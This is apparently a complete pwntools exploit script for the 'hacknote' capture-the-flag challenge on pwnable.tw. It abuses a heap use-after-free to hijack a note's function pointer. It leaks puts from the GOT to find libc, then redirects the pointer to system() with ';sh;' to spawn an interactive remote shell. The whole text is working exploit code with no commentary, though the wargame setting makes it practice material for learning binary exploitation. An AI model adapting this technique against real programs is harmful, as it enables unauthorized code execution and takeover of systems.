from pwn import *

NOTE_PRINT_SELF_ADDR = 0x0804862B

conn = remote('chall.pwnable.tw', 10102)
#conn = process('./hacknote')

libc = ELF('./libc_32.so.6')
#libc = ELF('/usr/lib/i386-linux-gnu/libc-2.31.so')

elf = ELF('./hacknote')

def print_until(s):
    print(conn.recvuntil(s)) 

def add_note(size, content):
    print_until(b'Your choice :')
    conn.sendline(b'1')    

    print_until(b'Note size :')
    conn.sendline(str(size).encode())

    print_until(b'Content :')
    conn.sendline(content)

def delete_note(index):
    print_until(b'Your choice :')
    conn.sendline('2')

    print_until(b'Index :')
    conn.sendline(str(index).encode())

def print_note(index):
    print_until(b'Your choice :')
    conn.sendline(b'3')

    print_until(b'Index :')
    conn.sendline(str(index).encode())

def main():
    add_note(1000, b'0')
    add_note(1000, b'1')

    delete_note(0)
    delete_note(1)
    
    add_note(8, p32(NOTE_PRINT_SELF_ADDR) + p32(elf.got['puts']))
    print_note(0)
    
    puts_addr = u32(conn.recv(4))
    print(f"[+] PUTS ADDR: {hex(puts_addr)}")
    
    libc_addr = puts_addr - libc.symbols['puts']
    print(f"[+] LIBC ADDR: {hex(libc_addr)}")
    
    system_addr = libc_addr + libc.symbols['system']
    print(f'[+] SYSTEM ADDR: {hex(system_addr)}')
    
    delete_note(2)
    add_note(8, p32(system_addr) + b';sh;')

    print_note(0)
    conn.interactive()


if __name__ == "__main__":
    main()
